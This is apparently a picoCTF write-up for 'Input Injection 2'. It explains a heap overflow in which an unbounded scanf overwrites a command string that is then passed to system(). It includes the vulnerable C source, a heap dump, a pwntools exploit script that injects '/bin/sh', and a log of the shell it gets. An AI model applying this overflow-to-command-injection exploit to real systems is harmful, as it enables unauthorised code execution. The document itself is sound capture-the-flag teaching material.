---
title: "Input Injection 2"
date: "2025-12-09"
tags: ["picoCTF", "buffer overflow", "heap"]
---


In this challenge they give us the source and a binary. Let's look at the code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
    fflush(stdout);
	printf("shell at %p\n", shell);
    fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
    fflush(stdout);
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
    fflush(stdout);
	
	return 0;
}
```

It just does 2 mallocs, leaks their position, and we get an overflow of the first malloc content thanks to this line that does not limit the size:

```c
scanf("%s", username);
```

Then the content in the use-data of the second chunk is passed to `system` like this:

```c
system(shell);
```

This is a simple heap overflow challenge. We only need to know how much padding to write to reach the use-data of the second chunk. That can be done by reading the code or by inspecting the heap:

```python
0000000000405300     0000000000000000 0000000000000031 # Chunk 1
0000000000405310     0000000061616161 0000000000000000 # aaaa de prueba
0000000000405320     0000000000000000 0000000000000000
0000000000405330     0000000000000000 0000000000000031 #Chunk 2
0000000000405340     6477702f6e69622f 0000000000000000
```

As we can see we have to write 6 quadwords (1 quadword = 8 bytes) to reach the content of the `shell` variable, which is later passed to `system`. So the exploit to get a shell would be this:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

def main():
    io = conn()
    
    bin_sh = b'/bin/sh'

    io.recvline(b'Enter username:')
    io.sendline(p64(0) * 6 + bin_sh)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py LOCAL                                                                                ℂ -gcc  3.13.7  05:35 
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/input_injection_2/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/picoCTF/input_injection_2/vuln_patched': pid 38732
[!] 'keepends' argument is deprecated. Use 'drop' instead.
[*] Switching to interactive mode
shell at 0x2ed2a340
Enter username: Hello, . Your shell is /bin/sh.
$ whoami
ub1cu0

```